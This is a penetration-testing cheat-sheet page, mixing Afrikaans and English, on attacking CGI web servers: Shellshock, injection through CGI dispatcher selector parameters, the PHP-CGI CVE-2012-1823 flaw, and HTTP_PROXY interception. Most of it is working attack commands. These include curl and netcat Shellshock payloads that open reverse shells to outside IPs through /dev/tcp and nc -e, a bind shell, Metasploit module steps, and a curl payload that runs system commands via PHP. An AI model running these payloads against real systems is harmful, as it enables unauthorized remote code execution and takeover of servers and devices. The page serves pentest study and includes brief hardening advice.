# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Inligting

Die **CGI scripts are perl scripts**, so, if you have compromised a server that can execute _**.cgi**_ scripts you can **upload a perl reverse shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\), **change the extension** from **.pl** to **.cgi**, give **execute permissions** \(`chmod +x`\) and **access** the reverse shell **from the web browser** to execute it.
In order to test for **CGI vulns** it's recommended to use `nikto -C all` \(and all the plugins\)

## **ShellShock**

**ShellShock** is 'n kwesbaarheid wat die wydgebruikte **Bash** command-line shell in Unix-gebaseerde bedryfstelsels raak. Dit mik op die vermoë van **Bash** om opdragte uit te voer wat deur toepassings deurgegee word. Die kwesbaarheid lê in die manipulasie van omgewingsveranderlikes, wat dinamiese benoemde waardes is wat beïnvloed hoe prosesse op 'n rekenaar loop. Aanvallers kan dit uitbuit deur kwaadwillige kode aan omgewingsveranderlikes te heg, wat uitgevoer word wanneer die veranderlike ontvang word. Dit stel aanvallers in staat om moontlik die stelsel te kompromitteer.

Wanneer hierdie kwesbaarheid uitgebuit word, kan die bladsy 'n fout werp.

Jy kan hierdie kwesbaarheid vind deur te let dat dit 'n ou **Apache**-weergawe en **cgi_mod** \(met 'n cgi-lêergids\) gebruik, of deur **nikto** te gebruik.

### **Toets**

Die meeste toetse is gebaseer op die gebruik van echo en verwag dat daardie string in die webrespons teruggestuur word. As jy dink 'n bladsy dalk kwesbaar is, soek alle cgi-bladsye en toets hulle.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(weerkaatsend, blind en out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## Gekentraliseerde CGI-dispatchers (enkel-endpoint routering via selector parameters)

Baie embedded web UIs multiplex dosyne bevoorregte aksies agter 'n enkele CGI-endpoint (byvoorbeeld, `/cgi-bin/cstecgi.cgi`) en gebruik 'n selector parameter soos `topicurl=<handler>` om die versoek na 'n interne funksie te stuur.

Metodologie om hierdie routers te misbruik:

- Enumereer handler names: scrape JS/HTML, brute-force with wordlists, or unpack firmware and grep for handler strings used by the dispatcher.
- Toets unauthenticated reachability: some handlers forget auth checks and are directly callable.
- Fokus op handlers wat system utilities aanroep of touch files; weak validators often only block a few characters and might miss the leading hyphen `-`.

Generic exploit shapes:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Opsporing en verharding:

- Kyk uit vir ongeauthentiseerde versoeke aan gesentraliseerde CGI-endpunte met `topicurl` gestel na sensitiewe handlers.
- Merk parameters wat met `-` begin (argv option injection attempts).
- Verskaffers: dwing authenticatie af op alle staatveranderende handlers, valideer met streng allowlists/types/lengths, en gee nooit deur gebruiker beheerde strings as command-line flags nie.

## Oude PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Basies, as cgi aktief is en php "oud" \(&lt;5.3.12 / &lt; 5.4.2\) kan jy kode uitvoer.
Om hierdie kwesbaarheid te misbruik moet jy toegang hê tot 'n PHP-lêer van die webbediener sonder om parameters te stuur \(spesifiek sonder om die karakter "=" te stuur\).
Dan, om hierdie kwesbaarheid te toets, kan jy byvoorbeeld toegang kry tot `/index.php?-s` \(let op die `-s`\) en **die bronkode van die toepassing sal in die respons verskyn**.

Dan, om **RCE** te verkry, kan jy hierdie spesiale navraag stuur: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` en die **PHP code** word in die **liggaam van die versoek** uitgevoer. Voorbeeld:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Meer inligting oor die vuln en moontlike exploits:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy \(MitM to Web server requests\)**

CGI skep 'n omgewingsveranderlike vir elke header in die http-aanvraag. Byvoorbeeld: "host:web.com" word geskep as "HTTP_HOST"="web.com"

Aangesien die HTTP_PROXY-variabele deur die webserver gebruik kan word. Probeer om 'n **header** te stuur wat die volgende bevat: "**Proxy: &lt;IP_attacker&gt;:&lt;PORT&gt;**" en as die server enige versoek gedurende die sessie uitvoer, sal jy elke versoek wat deur die server gemaak word, kan vasvang.

## **Verwysings**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
